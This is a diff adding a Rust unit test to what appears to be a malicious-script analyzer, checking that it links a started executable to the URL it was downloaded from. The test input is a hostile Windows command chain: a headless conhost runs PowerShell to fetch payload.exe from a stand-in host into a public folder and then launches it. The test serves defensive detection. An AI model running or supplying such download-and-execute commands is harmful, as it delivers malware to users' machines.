@@ -3466,6 +3466,27 @@ start "" "C:\Users\Public\payload.exe""#,
     }
 
     #[test]
+    fn start_local_target_resolves_prior_conhost_powershell_download_source_url() {
+        let report = analyze(
+            br#"conhost.exe --headless powershell.exe -NoP -Command "Invoke-WebRequest -Uri https://conhost-ps-start.example/payload.exe -OutFile C:\Users\Public\payload.exe"
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://conhost-ps-start.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior conhost PowerShell download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
